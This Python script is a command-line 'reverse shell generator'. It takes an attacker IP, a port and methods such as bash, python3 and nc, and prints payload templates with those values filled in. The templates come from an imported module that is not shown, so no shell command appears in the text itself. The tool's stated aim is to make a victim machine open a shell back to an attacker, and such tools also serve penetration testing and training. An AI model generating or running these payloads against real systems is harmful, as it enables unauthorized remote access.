#!/usr/bin/python3

import sys
import argparse
from methods import methods

parser = argparse.ArgumentParser(description="Command line reverse shell generator")
parser.add_argument('-i', metavar='<attacker ip>', help='Attacker ip address to receive the connection back from victim machine. Default = 127.0.0.1',default='127.0.0.1')
parser.add_argument('-p', metavar='<attacker port>', help='Attacker port to listen on. Default = 1337', default='1337')
parser.add_argument('-m', metavar='method to use', default='bash,python3,nc', help='A comma seperated list of reverse shell methods. Default is bash,python3,nc ')
parser.add_argument('-l', metavar='list methods', help='List available methods for reverse shells')
args = parser.parse_args()


port = args.p
ip = args.i
method_list = args.m.split(",")


for method in method_list:
  if methods.get(method):
    print(f'\n{method}: \n{methods.get(method).replace("<ip>",ip).replace("<port>", port)}')
